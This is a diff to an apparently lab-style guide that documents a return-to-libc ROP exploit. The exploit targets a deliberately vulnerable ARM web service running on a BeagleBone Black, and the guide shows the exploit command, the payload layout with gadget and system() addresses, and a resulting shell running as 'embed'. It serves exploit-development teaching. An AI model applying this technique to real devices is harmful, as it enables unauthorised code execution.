@@ -458,50 +458,61 @@ source exploit-env/bin/activate
 
 === Executing the exploit
 
+The script requires three arguments: the target URL, the SSH username, and the
+SSH password.  It connects to the BBB over SSH to confirm ASLR is disabled
+before sending the overflow.
+
 [source,bash]
 ----
-python3 demos/get_shell.py http://<bbb-ip>:8080
+python3 demos/get_shell.py http://<bbb-ip>:8080 <ssh-user> <ssh-password>
 ----
 
-Expected output in Terminal B:
+=== Validated output (live BBB run, ASLR disabled)
+
+Terminal B output (abbreviated banner omitted):
 
 ----
+[*] Checking ASLR on 192.168.7.2 …
+[+] ASLR disabled (randomize_va_space=0)
 [+] Service alive: {'running': False, 'digit': 0, 'place': 0}
 
 [*] ROP chain:
-    AAAA...  ← 92-byte padding to saved LR
-    0xb6db4cfc  ← pop {r0, r4, pc} (ARM, libc+0x59cfc, bit0=0)
-    0xb6e28660  ← "/bin/sh" (libc+0xcd660) → r0
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  ← 92-byte padding to saved LR
+    0xb6db4cfc  ← pop {r0, r4, pc} (ARM .text, libc+0x59cfc, bit0=0)
+    0xb6e28660  ← "/bin/sh" string (libc+0xcd660) → r0
     JUNK        ← junk → r4 (discarded)
-    0xb6d89211  ← system() (libc+0x2e211, Thumb) → pc
+    0xb6d89211  ← system() (libc+0x2e211, Thumb)  → pc
+    total payload: 108 B
 
-[*] Sending exploit → http://<bbb-ip>:8080/pi/start …
+[*] Sending exploit → http://192.168.7.2:8080/pi/start …
+[*] Shell will appear in the BBB SSH terminal.
 [*] (ReadTimeout) — system() is running, shell active on BBB
 ----
 
 A `ReadTimeout` (not a `ConnectionError`) indicates that the HTTP handler
 thread is alive and blocked inside `system()`, waiting for the child `sh`
 process to exit.  A `ConnectionError` means the service crashed before
-reaching `system()`.
+reaching `system()` — typically when the service was launched with `nohup`
+rather than interactively, because `sh` has no controlling terminal to wait on.
 
-Expected output in Terminal A (BBB SSH session):
+Terminal A output (BBB SSH session where `./rop-webservice` was started):
 
 ----
 HTTP server listening on port 8080
 $ ps
   PID TTY   TIME CMD
-  ... pts/3 ...  bash
-  ... pts/3 ...  rop-webservice
-  ... pts/3 ...  sh
-  ... pts/3 ...  ps
+  431 pts/0 00:00:00 bash
+  523 pts/0 00:00:00 rop-webservice
+  526 pts/0 00:00:00 sh
+  527 pts/0 00:00:00 ps
 $ whoami
 embed
 ----
 
-The `sh` process confirms that `system("/bin/sh")` executed successfully.
-Type `exit` to return from the shell; the webservice handler thread will resume
-and the service process will segfault (its stack frame is corrupted), which is
-expected.
+The `sh` process in `ps` confirms that `system("/bin/sh")` executed
+successfully and the shell is running as the `embed` user.  Type `exit` to
+return from the shell; the webservice handler thread resumes and the service
+segfaults (the stack frame is corrupted), which is expected.
 
 == Defeating ASLR with the OOB Read Primitive
 
